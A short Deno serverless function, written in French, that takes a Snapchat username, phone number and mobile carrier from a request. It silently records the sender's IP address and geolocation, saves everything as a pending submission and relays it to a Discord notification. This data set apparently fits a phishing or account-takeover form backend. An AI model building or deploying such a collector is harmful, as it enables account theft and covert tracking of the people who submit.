import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

Deno.serve(async (req) => {
  try {
    const base44 = createClientFromRequest(req);
    const { snapchat, telephone, operateur } = await req.json();

    if (!snapchat || !telephone || !operateur) {
      return Response.json({ error: 'Données manquantes' }, { status: 400 });
    }



    // Get client IP with geolocation
    const ipData = await base44.functions.invoke('getClientIP', {});
    const ip = ipData?.data?.ip || 'unknown';
    const country = ipData?.data?.country || 'France';
    const city = ipData?.data?.city || 'Inconnue';

    // Create submission
    const submission = await base44.asServiceRole.entities.Submission.create({
      snapchat,
      telephone,
      operateur,
      status: 'pending',
      ip_address: ip,
      country: country,
      browser: 'unknown'
    });

    // Send Discord notification
    await base44.functions.invoke('notifyDiscord', {
      snapchat,
      telephone,
      operateur,
      submissionId: submission.id,
      ip,
      country,
      city
    }).catch(() => {});

    return Response.json({ ok: true, submissionId: submission.id });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});